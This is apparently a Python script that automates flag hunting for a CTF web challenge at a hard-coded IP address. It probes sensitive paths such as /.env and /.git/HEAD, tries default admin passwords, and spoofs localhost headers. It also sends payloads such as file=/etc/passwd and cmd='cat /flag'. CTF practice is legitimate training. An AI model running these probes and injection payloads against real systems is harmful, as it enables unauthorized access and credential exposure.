import requests
import re
import base64
import html
import json
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

session = requests.Session()
session.verify = False
session.headers.update(HEADERS)

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
        r'key\{[^}]+\}',
        r'secret\{[^}]+\}',
        r'flag_[a-zA-Z0-9]+',
        r'FLAG_[a-zA-Z0-9]+',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def decode_and_check(text):
    flag = check_flag_pattern(text)
    if flag:
        return flag, "明文"
    
    try:
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
        for b64 in b64_patterns:
            try:
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                flag = check_flag_pattern(decoded)
                if flag:
                    return flag, "Base64解码"
            except:
                pass
    except:
        pass
    
    try:
        decoded = html.unescape(text)
        flag = check_flag_pattern(decoded)
        if flag:
            return flag, "HTML实体解码"
    except:
        pass
    
    return None, None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def analyze_main_page():
    print_section("1. 主页面分析")
    
    try:
        r = session.get(TARGET, timeout=TIMEOUT)
        print(f"\n  状态码: {r.status_code}")
        print(f"  页面标题: {r.headers.get('Server', 'N/A')}")
        
        html_content = r.text
        print(f"\n  页面内容:\n{html_content}\n")
        
        # 检查页面内容
        flag, method = decode_and_check(html_content)
        if flag:
            add_flag("页面内容", flag, method)
        
        # 检查HTML注释
        comments = re.findall(r'<!--(.*?)-->', html_content, re.DOTALL)
        if comments:
            print("\n  HTML注释:")
            for comment in comments:
                print(f"    {comment}")
                flag, method = decode_and_check(comment)
                if flag:
                    add_flag("HTML注释", flag, method)
        
        # 检查JavaScript
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL)
        if scripts:
            print("\n  JavaScript代码:")
            for script in scripts:
                if len(script) > 10:
                    print(f"    代码: {script[:200]}")
                    flag, method = decode_and_check(script)
                    if flag:
                        add_flag("JavaScript", flag, method)
        
        # 检查CSS
        styles = re.findall(r'<style[^>]*>(.*?)</style>', html_content, re.DOTALL)
        if styles:
            print("\n  CSS代码:")
            for style in styles:
                print(f"    样式: {style[:200]}")
                flag, method = decode_and_check(style)
                if flag:
                    add_flag("CSS", flag, method)
        
        # 检查隐藏元素
        hidden_elements = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', html_content)
        if hidden_elements:
            print("\n  隐藏表单元素:")
            for elem in hidden_elements:
                print(f"    {elem}")
        
        # 检查表单
        forms = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.DOTALL)
        if forms:
            print("\n  表单:")
            for form in forms:
                print(f"    {form[:300]}")
        
        return html_content
        
    except Exception as e:
        print(f"  错误: {e}")
        return None


def analyze_js_files(html):
    print_section("2. JavaScript文件分析")
    
    if not html:
        return
    
    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
    
    if not js_files:
        print("  未发现外部JS文件")
        return
    
    print(f"\n  发现 {len(js_files)} 个JS文件")
    
    for js_file in js_files:
        url = urljoin(TARGET, js_file)
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                content = r.text
                print(f"\n  分析: {js_file}")
                print(f"  大小: {len(content)} bytes")
                
                # 检查flag
                flag, method = decode_and_check(content)
                if flag:
                    add_flag(f"JS文件: {js_file}", flag, method)
                
                # 检查特殊变量
                var_patterns = [
                    r'(?:var|let|const)\s+(?:flag|FLAG|secret|key|token)\s*=\s*["\']([^"\']+)["\']',
                    r'(?:flag|FLAG|secret|key|token)\s*[:=]\s*["\']([^"\']+)["\']',
                    r'(?:password|pass|pwd)\s*[:=]\s*["\']([^"\']+)["\']',
                ]
                for pattern in var_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        print(f"    发现变量: {match}")
                        flag, method = decode_and_check(match)
                        if flag:
                            add_flag(f"JS变量: {js_file}", flag, method)
                
                # 检查base64编码
                b64_strings = re.findall(r'[A-Za-z0-9+/]{30,}={0,2}', content)
                if b64_strings:
                    print(f"    发现 {len(b64_strings)} 个长Base64字符串")
                    for b64 in b64_strings[:5]:
                        try:
                            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                            if len(decoded) < 200:
                                print(f"      解码后: {decoded[:100]}")
                            flag, method = decode_and_check(decoded)
                            if flag:
                                add_flag(f"JS Base64: {js_file}", flag, method)
                        except:
                            pass
                                
        except Exception as e:
            print(f"  无法获取: {e}")


def test_paths():
    print_section("3. 路径探测")
    
    common_paths = [
        "/flag", "/flag.txt", "/flag.php", "/flag.html",
        "/ctf", "/ctf.txt", "/ctf.php",
        "/secret", "/secret.txt", "/secret.php",
        "/key", "/key.txt",
        "/admin", "/admin.php",
        "/login", "/login.php",
        "/api", "/api/flag",
        "/robots.txt", "/sitemap.xml",
        "/.env", "/.git/HEAD",
        "/debug", "/test",
        "/info", "/info.php", "/phpinfo.php",
        "/backup", "/backup.txt",
        "/data", "/data.json",
        "/config", "/config.json",
        "/source", "/source.php",
        "/view", "/view.php",
        "/file", "/file.php",
    ]
    
    for path in common_paths:
        url = urljoin(TARGET, path)
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in [404, 503]:
                print(f"\n  [{r.status_code}] {path}")
                print(f"     Content-Type: {r.headers.get('Content-Type', '')}")
                
                if len(r.text) > 0:
                    content_preview = r.text[:200]
                    print(f"     内容: {content_preview}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"路径: {path}", flag, method)
                        
        except:
            pass


def test_post_requests(html):
    print_section("4. POST请求测试")
    
    # 提取表单信息
    forms = re.findall(r'<form[^>]*>', html) if html else []
    action_pattern = re.compile(r'action=["\']([^"\']*)["\']')
    method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.I)
    
    for form in forms:
        action = action_pattern.search(form)
        method = method_pattern.search(form)
        action_url = action.group(1) if action else ""
        form_method = method.group(1) if method else "GET"
        
        print(f"\n  发现表单: {form_method} {action_url}")
    
    # 测试常见POST路径
    post_paths = ["/", "/login", "/submit", "/check", "/verify", "/api"]
    
    post_data_list = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "123456"},
        {"flag": "true"},
        {"debug": "true"},
        {"action": "get_flag"},
        {"cmd": "cat /flag"},
        {"file": "/flag"},
        {"id": "1"},
        {"name": "test"},
    ]
    
    for path in post_paths:
        url = urljoin(TARGET, path)
        for data in post_data_list[:5]:
            try:
                r = session.post(url, data=data, timeout=TIMEOUT)
                if r.status_code != 404:
                    print(f"\n  [{r.status_code}] POST {path}")
                    print(f"     数据: {data}")
                    
                    if len(r.text) > 0:
                        print(f"     响应: {r.text[:150]}")
                        flag, method = decode_and_check(r.text)
                        if flag:
                            add_flag(f"POST {path}", flag, method)
                            
            except:
                pass


def test_special_headers():
    print_section("5. 特殊请求头测试")
    
    special_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/flag"},
        {"X-Rewrite-URL": "/flag"},
        {"Host": "localhost"},
        {"Host": "127.0.0.1"},
        {"X-Debug": "true"},
        {"X-Flag": "true"},
        {"Debug": "true"},
        {"Accept": "*/*"},
        {"Accept": "text/html"},
        {"Referer": TARGET},
        {"Referer": "http://localhost"},
    ]
    
    for headers in special_headers:
        try:
            r = session.get(TARGET, headers=headers, timeout=TIMEOUT)
            if r.status_code != 200 or len(r.text) > 2097:
                print(f"\n  [{r.status_code}] {headers}")
                print(f"     内容: {r.text[:150]}")
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"特殊头: {headers}", flag, method)
                    
        except:
            pass


def test_query_params():
    print_section("6. 查询参数测试")
    
    params_list = [
        {"flag": "1"},
        {"debug": "1"},
        {"test": "1"},
        {"source": "1"},
        {"file": "/etc/passwd"},
        {"file": "/flag"},
        {"file": "flag.txt"},
        {"page": "flag"},
        {"id": "1"},
        {"action": "flag"},
        {"show": "flag"},
        {"cmd": "ls"},
        {"cmd": "cat /flag"},
    ]
    
    for params in params_list:
        try:
            r = session.get(TARGET, params=params, timeout=TIMEOUT)
            if len(r.text) > 2097 or r.status_code != 200:
                print(f"\n  [{r.status_code}] ?{params}")
                print(f"     内容: {r.text[:150]}")
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"参数: {params}", flag, method)
                    
        except:
            pass


def main():
    print("*" * 70)
    print("  CTF FLAG 搜索")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    html = analyze_main_page()
    analyze_js_files(html)
    test_paths()
    test_post_requests(html)
    test_special_headers()
    test_query_params()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  分析:")
        print("     - 页面标题: '你想干嘛！！！'")
        print("     - 服务器: Term3Lab/1.0 Python/3.13.5")
        print("     - 这是一个CTF挑战页面")
        print("\n  建议下一步:")
        print("     1. 使用浏览器打开页面查看完整内容")
        print("     2. 检查页面交互元素（按钮、输入框）")
        print("     3. 查看浏览器开发者工具的控制台输出")
        print("     4. 检查网络请求（XHR、Fetch）")
        print("     5. 尝试输入特定关键词触发隐藏内容")
    
    print()


if __name__ == "__main__":
    main()